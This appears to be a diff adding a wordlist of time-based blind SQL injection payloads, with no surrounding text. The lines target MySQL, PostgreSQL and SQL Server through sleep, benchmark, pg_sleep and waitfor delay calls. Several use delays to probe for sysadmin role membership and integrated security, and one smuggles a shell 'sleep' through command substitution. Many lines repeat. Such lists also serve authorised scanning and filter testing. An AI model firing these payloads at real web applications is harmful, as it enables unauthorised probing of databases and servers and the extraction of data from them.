+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1  )   or sleep  (  __TIME__  )  #
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or sleep  (  __TIME__  )  #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or pg_sleep  (  __TIME__  )  --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1 waitfor delay '0:0:10'--
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+or sleep  (  __TIME__  )  #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+or sleep  (  __TIME__  )    =  '
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+pg_sleep  (  __TIME__  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+ )    )    or sleep  (  __TIME__  )    =  '
+1" where 7739  =  7739 and sleep  (  5  )  --
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+$  (  sleep 50  ) 
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1" where 7739  =  7739 and sleep  (  5  )  --
+1"   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1 waitfor delay '0:0:10'--
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or pg_sleep  (  __TIME__  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+or sleep  (  __TIME__  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+, if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+ )   or pg_sleep  (  __TIME__  )  --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or sleep  (  __TIME__  )  #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+1%"   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1" where 7739  =  7739 and sleep  (  5  )  --
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+a' waitfor delay '0:0:10'--
+a' waitfor delay '0:0:10'--
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+sleep  (  __TIME__  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+a' waitfor delay '0:0:10'--
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or sleep  (  __TIME__  )  #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+ )    )    or pg_sleep  (  __TIME__  )  --
+1'  )   rlike sleep  (  5  )  #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+or sleep  (  __TIME__  )    =  '
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+" or sleep  (  __TIME__  )  #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1 waitfor delay '0:0:10'--
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1'  )   rlike sleep  (  5  )  #
+ )   or pg_sleep  (  __TIME__  )  --
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+ )    )    or pg_sleep  (  __TIME__  )  --
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ )  ,waitfor delay '0:0:__TIME__'--
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1" where 7739  =  7739 and sleep  (  5  )  --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1  )   or sleep  (  __TIME__  )  #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1 or pg_sleep  (  __TIME__  )  --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1 waitfor delay '0:0:10'--
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+"  )   or sleep  (  __TIME__  )    =  "
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+" or sleep  (  __TIME__  )  #
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1%"   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+" or sleep  (  __TIME__  )  #
+,waitfor delay '0:0:__TIME__'--
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1 waitfor delay '0:0:10'--
+ )    )   ,waitfor delay '0:0:__TIME__'--
+"   )    )    or pg_sleep  (  __TIME__  )  --
+1" where 7739  =  7739 and sleep  (  5  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1"   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+pg_sleep  (  __TIME__  )  --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ )   or pg_sleep  (  __TIME__  )  --
+1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ )    )   ,waitfor delay '0:0:__TIME__'--
+ )    )   ,waitfor delay '0:0:__TIME__'--
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+or sleep  (  __TIME__  )  #
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+" or sleep  (  __TIME__  )    =  "
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1%" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'  )   rlike sleep  (  5  )  #
+1 or pg_sleep  (  __TIME__  )  --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+" or sleep  (  __TIME__  )    =  "
+"  )   or pg_sleep  (  __TIME__  )  --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or pg_sleep  (  __TIME__  )  --
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1'  )   rlike sleep  (  5  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1" where 7739  =  7739 and sleep  (  5  )  --
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or sleep  (  __TIME__  )    =  "
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+or sleep  (  __TIME__  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+" or sleep  (  __TIME__  )    =  "
+or sleep  (  __TIME__  )    =  '
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+or sleep  (  __TIME__  )    =  '
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1%" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1%"  )   rlike sleep  (  5  )   and   (  "%"  =  "
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1" where 7739  =  7739 and sleep  (  5  )  --
+1 or pg_sleep  (  __TIME__  )  --
+1"   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+"  )   or pg_sleep  (  __TIME__  )  --
+1" where 7739  =  7739 and sleep  (  5  )  --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1"   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+pg_sleep  (  __TIME__  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+" or sleep  (  __TIME__  )  #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+ )  ,waitfor delay '0:0:__TIME__'--
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1 waitfor delay '0:0:10'--
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"   )    )    or pg_sleep  (  __TIME__  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ )   or sleep  (  __TIME__  )    =  '
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+1" where 7739  =  7739 and sleep  (  5  )  --
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+or sleep  (  __TIME__  )  #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )    or sleep  (  __TIME__  )    =  '
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1  )   or sleep  (  __TIME__  )  #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or pg_sleep  (  __TIME__  )  --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+" or sleep  (  __TIME__  )    =  "
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+or sleep  (  __TIME__  )    =  '
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1%" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1%"   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1 or pg_sleep  (  __TIME__  )  --
+or sleep  (  __TIME__  )  #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or sleep  (  __TIME__  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+a' waitfor delay '0:0:10'--
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1   )    )    or sleep  (  5  )  #
+" or sleep  (  __TIME__  )  #
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1%"   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1  )   or sleep  (  __TIME__  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'  )   rlike sleep  (  5  )  #
+1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1" where 7739  =  7739 and sleep  (  5  )  --
+1 or pg_sleep  (  __TIME__  )  --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+or sleep  (  __TIME__  )    =  '
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ )    )    or sleep  (  __TIME__  )    =  '
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+" or sleep  (  __TIME__  )  #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1 or pg_sleep  (  __TIME__  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+or sleep  (  __TIME__  )    =  '
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
